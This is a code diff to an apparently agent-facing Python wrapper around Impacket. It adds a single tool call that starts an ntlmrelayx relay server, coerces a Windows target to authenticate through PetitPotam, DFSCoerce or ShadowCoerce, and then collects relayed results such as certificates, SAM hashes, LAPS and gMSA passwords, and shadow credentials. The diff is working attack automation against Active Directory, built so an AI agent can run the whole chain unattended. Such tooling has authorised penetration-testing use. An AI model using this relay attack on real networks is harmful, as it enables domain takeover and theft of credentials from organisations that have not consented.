@@ -1,4 +1,8 @@
+import asyncio
+import contextlib
+import os
 import re
+import signal
 import shutil
 import sys
 from pathlib import Path
@@ -111,6 +115,167 @@ def _get_impacket_script_path() -> Path:
 
 
 g_default_impacket_path = _get_impacket_script_path()
+
+# Coercion script paths for combined relay+coerce tool
+_COERCION_SCRIPTS: dict[str, tuple[Path, str, str]] = {
+    "petitpotam": (
+        Path("/opt/PetitPotam/"),
+        "PetitPotam.py",
+        "https://github.com/topotam/PetitPotam",
+    ),
+    "dfscoerce": (
+        Path("/opt/DFSCoerce/"),
+        "dfscoerce.py",
+        "https://github.com/Wh04m1001/DFSCoerce",
+    ),
+    "shadowcoerce": (
+        Path("/opt/ShadowCoerce/"),
+        "shadowcoerce.py",
+        "https://github.com/ShutdownRepo/ShadowCoerce",
+    ),
+}
+
+# Patterns in ntlmrelayx stdout that indicate a successful relay
+_RELAY_SUCCESS_PATTERNS = [
+    "certificate",
+    "got certificate",
+    "dumping",
+    "sam hashes",
+    "authenticating against",
+    "relay succeeded",
+    "shadow credentials",
+    "msds-keycredentiallink",
+    "escalating",
+    "adding computer",
+    "laps password",
+    "gmsa password",
+]
+
+# How long to wait after SIGTERM before escalating to SIGKILL.
+_SIGKILL_TIMEOUT = 5.0
+
+
+async def _wait_for_relay_ready(
+    proc: asyncio.subprocess.Process,
+    output_buffer: list[str],
+    timeout: float = 30,
+) -> bool:
+    """Read ntlmrelayx stdout until 'Servers started' appears or timeout.
+
+    Returns True if the relay is ready, False on early exit or timeout.
+    """
+    assert proc.stdout is not None
+    loop = asyncio.get_running_loop()
+    deadline = loop.time() + timeout
+
+    while loop.time() < deadline:
+        remaining = deadline - loop.time()
+        try:
+            line = await asyncio.wait_for(
+                proc.stdout.readline(), timeout=min(remaining, 5)
+            )
+        except TimeoutError:
+            if proc.returncode is not None:
+                return False
+            continue
+
+        if not line:
+            return False  # EOF — process exited
+
+        decoded = line.decode(errors="replace")
+        output_buffer.append(decoded)
+
+        if "servers started" in decoded.lower():
+            return True
+
+        # Early failure: port bind error
+        lower = decoded.lower()
+        if "error" in lower and ("bind" in lower or "address already in use" in lower):
+            return False
+
+    return False
+
+
+async def _wait_for_relay_result(
+    proc: asyncio.subprocess.Process,
+    output_buffer: list[str],
+    timeout: float = 90,
+) -> bool:
+    """Read ntlmrelayx stdout looking for success indicators.
+
+    On match, continues reading for 5 more seconds to capture follow-up
+    data (certificate values, hashes, etc.) before returning.
+    """
+    assert proc.stdout is not None
+    loop = asyncio.get_running_loop()
+    deadline = loop.time() + timeout
+
+    while loop.time() < deadline:
+        remaining = deadline - loop.time()
+        try:
+            line = await asyncio.wait_for(
+                proc.stdout.readline(), timeout=min(remaining, 5)
+            )
+        except TimeoutError:
+            if proc.returncode is not None:
+                break
+            continue
+
+        if not line:
+            break
+
+        decoded = line.decode(errors="replace")
+        output_buffer.append(decoded)
+
+        lower = decoded.lower()
+        if any(pattern in lower for pattern in _RELAY_SUCCESS_PATTERNS):
+            # Drain follow-up output (cert data, hash values) for up to 5s total
+            drain_deadline = loop.time() + 5
+            try:
+                while loop.time() < drain_deadline:
+                    drain_remaining = drain_deadline - loop.time()
+                    extra = await asyncio.wait_for(
+                        proc.stdout.readline(), timeout=drain_remaining
+                    )
+                    if not extra:
+                        break
+                    output_buffer.append(extra.decode(errors="replace"))
+            except TimeoutError:
+                pass
+            return True
+
+    return False
+
+
+async def _kill_relay(proc: asyncio.subprocess.Process) -> None:
+    """Terminate a relay subprocess and its process group.
+
+    Sends SIGTERM to the process group, waits up to 5 seconds, then
+    escalates to SIGKILL.  Requires the subprocess was created with
+    ``start_new_session=True``.
+    """
+    if proc.returncode is not None:
+        return
+
+    pid = proc.pid
+    if pid is None:
+        return
+
+    try:
+        pgid = os.getpgid(pid)
+    except (OSError, ProcessLookupError):
+        return
+
+    with contextlib.suppress(OSError, ProcessLookupError):
+        os.killpg(pgid, signal.SIGTERM)
+
+    try:
+        await asyncio.wait_for(proc.wait(), timeout=_SIGKILL_TIMEOUT)
+    except TimeoutError:
+        with contextlib.suppress(OSError, ProcessLookupError):
+            os.killpg(pgid, signal.SIGKILL)
+        with contextlib.suppress(ProcessLookupError):
+            await proc.wait()
 
 
 class Impacket(Toolset):
@@ -327,6 +492,201 @@ class Impacket(Toolset):
             flags.extend(["-target-ip", target_ip])
 
         return flags
+
+    def _build_ntlmrelayx_args(
+        self,
+        *,
+        target: str | None = None,
+        targets_file: str | None = None,
+        smb2support: bool = False,
+        socks: bool = False,
+        interface_ip: str | None = None,
+        smb_port: int | None = None,
+        http_port: str | None = None,
+        exec_command: str | None = None,
+        interactive: bool = False,
+        lootdir: str | None = None,
+        output_file: str | None = None,
+        dump_hashes: bool = False,
+        escalate_user: str | None = None,
+        delegate_access: bool = False,
+        dump_laps: bool = False,
+        dump_gmsa: bool = False,
+        dump_adcs: bool = False,
+        add_computer: str | None = None,
+        no_dump: bool = False,
+        no_da: bool = False,
+        no_acl: bool = False,
+        adcs: bool = False,
+        template: str | None = None,
+        altname: str | None = None,
+        shadow_credentials: bool = False,
+        shadow_target: str | None = None,
+        remove_mic: bool = False,
+        no_smb_server: bool = False,
+        no_http_server: bool = False,
+        no_wcf_server: bool = False,
+        no_raw_server: bool = False,
+    ) -> list[str]:
+        """Build the argument list for ntlmrelayx.py.
+
+        Shared by :meth:`impacket_ntlmrelayx` (standalone) and
+        :meth:`impacket_ntlmrelay_attack` (combined relay+coerce).
+        """
+        args: list[str] = []
+
+        if target:
+            args.extend(["-t", target])
+        if targets_file:
+            args.extend(["-tf", targets_file])
+        if smb2support:
+            args.append("-smb2support")
+        if socks:
+            args.append("-socks")
+        if interface_ip:
+            args.extend(["-ip", interface_ip])
+        if smb_port is not None:
+            args.extend(["--smb-port", str(smb_port)])
+        if http_port:
+            args.extend(["--http-port", http_port])
+        if exec_command:
+            args.extend(["-c", exec_command])
+        if interactive:
+            args.append("-i")
+        if lootdir:
+            args.extend(["-l", lootdir])
+        if output_file:
+            args.extend(["-of", output_file])
+        if dump_hashes:
+            args.append("-dh")
+
+        # LDAP options
+        if escalate_user:
+            args.extend(["--escalate-user", escalate_user])
+        if delegate_access:
+            args.append("--delegate-access")
+        if dump_laps:
+            args.append("--dump-laps")
+        if dump_gmsa:
+            args.append("--dump-gmsa")
+        if dump_adcs:
+            args.append("--dump-adcs")
+        if no_dump:
+            args.append("--no-dump")
+        if no_da:
+            args.append("--no-da")
+        if no_acl:
+            args.append("--no-acl")
+
+        # AD CS options
+        if adcs:
+            args.append("--adcs")
+        if template:
+            args.extend(["--template", template])
+        if altname:
+            args.extend(["--altname", altname])
+
+        # Shadow Credentials options
+        if shadow_credentials:
+            args.append("--shadow-credentials")
+        if shadow_target:
+            args.extend(["--shadow-target", shadow_target])
+
+        # Exploit options
+        if remove_mic:
+            args.append("--remove-mic")
+
+        # Server disable options
+        if no_smb_server:
+            args.append("--no-smb-server")
+        if no_http_server:
+            args.append("--no-http-server")
+        if no_wcf_server:
+            args.append("--no-wcf-server")
+        if no_raw_server:
+            args.append("--no-raw-server")
+
+        if add_computer:
+            args.extend(["--add-computer", add_computer])
+
+        return args
+
+    def _build_coercion_command(
+        self,
+        method: str,
+        listener: str,
+        target: str,
+        *,
+        username: str | None = None,
+        password: str | None = None,
+        domain: str | None = None,
+        hashes: str | None = None,
+        kerberos: bool = False,
+        dc_ip: str | None = None,
+        pipe: str | None = None,
+    ) -> list[str]:
+        """Build the command list for a coercion script.
+
+        Args:
+            method: Coercion method (petitpotam, dfscoerce, shadowcoerce).
+            listener: IP address the relay server is listening on.
+            target: Machine to coerce authentication from.
+            username: Username for authentication to the target.
+            password: Password for authentication.
+            domain: Domain name.
+            hashes: NTLM hashes for authentication.
+            kerberos: Use Kerberos authentication (petitpotam/dfscoerce only).
+            dc_ip: Domain controller IP (petitpotam/dfscoerce only).
+            pipe: Named pipe to use (petitpotam only).
+
+        Returns:
+            Complete command list ready for execution.
+
+        Raises:
+            ValueError: If method is not recognized.
+            FileNotFoundError: If the coercion script is not installed.
+        """
+        if method not in _COERCION_SCRIPTS:
+            raise ValueError(
+                f"Unknown coercion method '{method}'. "
+                f"Choose from: {', '.join(_COERCION_SCRIPTS)}"
+            )
+
+        base_path, script_name, repo_url = _COERCION_SCRIPTS[method]
+        script = base_path / script_name
+        if not script.is_file():
+            raise FileNotFoundError(
+                f"Coercion script '{script_name}' not found at '{base_path}'. "
+                f"Install via: git clone {repo_url} {base_path}"
+            )
+
+        args: list[str] = []
+        if username:
+            args.extend(["-u", username])
+        if hashes:
+            args.extend(["-hashes", hashes])
+        elif password:
+            args.extend(["-p", password])
+        if domain:
+            args.extend(["-d", domain])
+
+        # Auto -no-pass when no creds provided (prevents interactive prompt)
+        if not password and not hashes:
+            args.append("-no-pass")
+
+        # petitpotam/dfscoerce support -k and -dc-ip; shadowcoerce does not
+        if method != "shadowcoerce":
+            if kerberos:
+                args.append("-k")
+            if dc_ip:
+                args.extend(["-dc-ip", dc_ip])
+
+        # -pipe is petitpotam-only
+        if pipe and method == "petitpotam":
+            args.extend(["-pipe", pipe])
+
+        args.extend([listener, target])
+        return [sys.executable, str(script), *args]
 
     @tool_method(catch=True)
     async def impacket_rbcd(
@@ -1909,111 +2269,42 @@ class Impacket(Toolset):
             env: Optional environment variables.
             input: Optional input string to pass to the command's stdin.
         """
-        # Validation
         if not target and not targets_file:
             raise ValueError("Must provide either target or targets_file")
 
-        # Build command - no identity needed, this is a relay server
-        args = []
-
-        if target:
-            args.extend(["-t", target])
-
-        if targets_file:
-            args.extend(["-tf", targets_file])
-
-        if smb2support:
-            args.append("-smb2support")
-
-        if socks:
-            args.append("-socks")
-
-        if interface_ip:
-            args.extend(["-ip", interface_ip])
-
-        if smb_port is not None:
-            args.extend(["--smb-port", str(smb_port)])
-
-        if http_port:
-            args.extend(["--http-port", http_port])
-
-        if exec_command:
-            args.extend(["-c", exec_command])
-
-        if interactive:
-            args.append("-i")
-
-        if lootdir:
-            args.extend(["-l", lootdir])
-
-        if output_file:
-            args.extend(["-of", output_file])
-
-        if dump_hashes:
-            args.append("-dh")
-
-        # LDAP options
-        if escalate_user:
-            args.extend(["--escalate-user", escalate_user])
-
-        if delegate_access:
-            args.append("--delegate-access")
-
-        if dump_laps:
-            args.append("--dump-laps")
-
-        if dump_gmsa:
-            args.append("--dump-gmsa")
-
-        if dump_adcs:
-            args.append("--dump-adcs")
-
-        if no_dump:
-            args.append("--no-dump")
-
-        if no_da:
-            args.append("--no-da")
-
-        if no_acl:
-            args.append("--no-acl")
-
-        # AD CS options
-        if adcs:
-            args.append("--adcs")
-
-        if template:
-            args.extend(["--template", template])
-
-        if altname:
-            args.extend(["--altname", altname])
-
-        # Shadow Credentials options
-        if shadow_credentials:
-            args.append("--shadow-credentials")
-
-        if shadow_target:
-            args.extend(["--shadow-target", shadow_target])
-
-        # Exploit options
-        if remove_mic:
-            args.append("--remove-mic")
-
-        # Server disable options
-        if no_smb_server:
-            args.append("--no-smb-server")
-
-        if no_http_server:
-            args.append("--no-http-server")
-
-        if no_wcf_server:
-            args.append("--no-wcf-server")
-
-        if no_raw_server:
-            args.append("--no-raw-server")
-
-        # Add computer (takes space-separated values)
-        if add_computer:
-            args.extend(["--add-computer", add_computer])
+        args = self._build_ntlmrelayx_args(
+            target=target,
+            targets_file=targets_file,
+            smb2support=smb2support,
+            socks=socks,
+            interface_ip=interface_ip,
+            smb_port=smb_port,
+            http_port=http_port,
+            exec_command=exec_command,
+            interactive=interactive,
+            lootdir=lootdir,
+            output_file=output_file,
+            dump_hashes=dump_hashes,
+            escalate_user=escalate_user,
+            delegate_access=delegate_access,
+            dump_laps=dump_laps,
+            dump_gmsa=dump_gmsa,
+            dump_adcs=dump_adcs,
+            add_computer=add_computer,
+            no_dump=no_dump,
+            no_da=no_da,
+            no_acl=no_acl,
+            adcs=adcs,
+            template=template,
+            altname=altname,
+            shadow_credentials=shadow_credentials,
+            shadow_target=shadow_target,
+            remove_mic=remove_mic,
+            no_smb_server=no_smb_server,
+            no_http_server=no_http_server,
+            no_wcf_server=no_wcf_server,
+            no_raw_server=no_raw_server,
+        )
 
         return await execute(
             self._build_script_command("ntlmrelayx.py", args),
@@ -2021,6 +2312,188 @@ class Impacket(Toolset):
             input=input,
             env=env,
         )
+
+    @tool_method(catch=True)
+    async def impacket_ntlmrelay_attack(
+        self,
+        *,
+        # Relay target
+        target: str,
+        # Relay config
+        interface_ip: str,
+        smb2support: bool = True,
+        adcs: bool = False,
+        template: str | None = None,
+        # Other relay actions
+        dump_hashes: bool = False,
+        delegate_access: bool = False,
+        shadow_credentials: bool = False,
+        shadow_target: str | None = None,
+        exec_command: str | None = None,
+        escalate_user: str | None = None,
+        add_computer: str | None = None,
+        # Server toggles
+        no_smb_server: bool = False,
+        no_http_server: bool = False,
+        no_wcf_server: bool = False,
+        no_raw_server: bool = False,
+        # Coercion config
+        coerce_method: str = "petitpotam",
+        coerce_target: str,
+        coerce_username: str | None = None,
+        coerce_password: str | None = None,
+        coerce_domain: str | None = None,
+        coerce_hashes: str | None = None,
+        coerce_dc_ip: str | None = None,
+        coerce_pipe: str | None = None,
+        # Timing
+        relay_timeout: int = 120,
+        env: dict[str, str] | None = None,
+    ) -> str:
+        """
+        Combined NTLM relay + coercion attack in a single tool call.
+
+        Starts ntlmrelayx as a relay server, waits for it to be ready, then
+        fires a coercion attack (PetitPotam, DFSCoerce, or ShadowCoerce)
+        to force the target machine to authenticate to the relay. Monitors
+        relay output for success indicators and returns the combined result.
+
+        This solves the sequencing problem where ntlmrelayx must be running
+        *before* coercion fires, which is impossible with sequential tool calls.
+
+        Args:
+            target: Relay destination (URL like "http://ca/certsrv/certfnsh.asp"
+                or "smb://dc01").
+            interface_ip: IP address to bind relay listeners on AND the address
+                the coercion target will authenticate back to.
+            smb2support: Enable SMB2 support (default True).
+            adcs: Enable AD CS relay attack.
+            template: AD CS certificate template (e.g. "DomainController").
+            dump_hashes: Show encrypted hashes in console.
+            delegate_access: LDAP delegate access on relayed computer account.
+            shadow_credentials: Enable Shadow Credentials relay attack.
+            shadow_target: Target account for Shadow Credentials.
+            exec_command: Command to execute on target after relay (SMB/RPC).
+            escalate_user: LDAP user to escalate privileges for.
+            add_computer: Add computer account (format: "NAME PASSWORD").
+            no_smb_server: Disable SMB listener.
+            no_http_server: Disable HTTP listener.
+            no_wcf_server: Disable WCF listener.
+            no_raw_server: Disable RAW listener.
+            coerce_method: Coercion protocol — "petitpotam", "dfscoerce",
+                or "shadowcoerce" (default: "petitpotam").
+            coerce_target: Machine to coerce authentication from (IP or hostname).
+            coerce_username: Username for coercion authentication.
+            coerce_password: Password for coercion authentication.
+            coerce_domain: Domain for coercion authentication.
+            coerce_hashes: NTLM hashes for coercion authentication.
+            coerce_dc_ip: Domain controller IP for coercion.
+            coerce_pipe: Named pipe for PetitPotam (e.g. "efsr", "lsarpc").
+            relay_timeout: Total timeout in seconds (default 120).
+            env: Optional environment variables for subprocesses.
+        """
+        # Build coercion command first — validates script exists before
+        # starting the relay server
+        coerce_cmd = self._build_coercion_command(
+            coerce_method,
+            interface_ip,
+            coerce_target,
+            username=coerce_username,
+            password=coerce_password,
+            domain=coerce_domain,
+            hashes=coerce_hashes,
+            dc_ip=coerce_dc_ip,
+            pipe=coerce_pipe,
+        )
+
+        relay_args = self._build_ntlmrelayx_args(
+            target=target,
+            smb2support=smb2support,
+            interface_ip=interface_ip,
+            adcs=adcs,
+            template=template,
+            dump_hashes=dump_hashes,
+            delegate_access=delegate_access,
+            shadow_credentials=shadow_credentials,
+            shadow_target=shadow_target,
+            exec_command=exec_command,
+            escalate_user=escalate_user,
+            add_computer=add_computer,
+            no_smb_server=no_smb_server,
+            no_http_server=no_http_server,
+            no_wcf_server=no_wcf_server,
+            no_raw_server=no_raw_server,
+        )
+        relay_cmd = self._build_script_command("ntlmrelayx.py", relay_args)
+
+        # Prepare environment
+        process_env = os.environ.copy()
+        if env:
+            process_env.update(env)
+
+        relay_proc = await asyncio.create_subprocess_exec(
+            *relay_cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.STDOUT,
+            start_new_session=True,
+            env=process_env,
+        )
+
+        relay_output: list[str] = []
+        coerce_result = ""
+
+        try:
+            # Readiness gets at most half the total budget, capped at 30s
+            ready_timeout = min(relay_timeout // 2, 30)
+
+            # Wait for relay to bind its listeners
+            ready = await _wait_for_relay_ready(
+                relay_proc, relay_output, timeout=ready_timeout
+            )
+            if not ready:
+                captured = "".join(relay_output)
+                raise RuntimeError(
+                    f"ntlmrelayx failed to start within {ready_timeout}s.\n\n"
+                    f"Output:\n{captured}"
+                )
+
+            # Fire coercion — the target authenticates back to our relay
+            logger.info(
+                f"Relay ready. Running {coerce_method} coercion against {coerce_target}"
+            )
+            coerce_timeout = min(30, relay_timeout - ready_timeout)
+            try:
+                coerce_result = await execute(
+                    coerce_cmd, timeout=coerce_timeout, env=env
+                )
+            except (RuntimeError, TimeoutError) as exc:
+                coerce_result = f"[coercion error] {exc}"
+                logger.warning(f"Coercion failed: {exc}")
+                # Don't abort — relay may still capture auth from retries
+                # or other sources
+
+            # Monitor relay for success with whatever time remains
+            remaining = max(relay_timeout - ready_timeout - coerce_timeout, 1)
+            success = await _wait_for_relay_result(
+                relay_proc, relay_output, timeout=remaining
+            )
+
+            # Assemble result
+            full_relay = "".join(relay_output)
+            parts = [f"=== ntlmrelayx output ===\n{full_relay}"]
+            if coerce_result:
+                parts.append(
+                    f"\n=== {coerce_method} coercion output ===\n{coerce_result}"
+                )
+            if not success:
+                parts.append(
+                    "\n[!] No relay success indicator detected within timeout. "
+                    "Check output above for partial results."
+                )
+            return "\n".join(parts)
+
+        finally:
+            await _kill_relay(relay_proc)
 
     @tool_method(catch=True)
     async def impacket_owneredit(
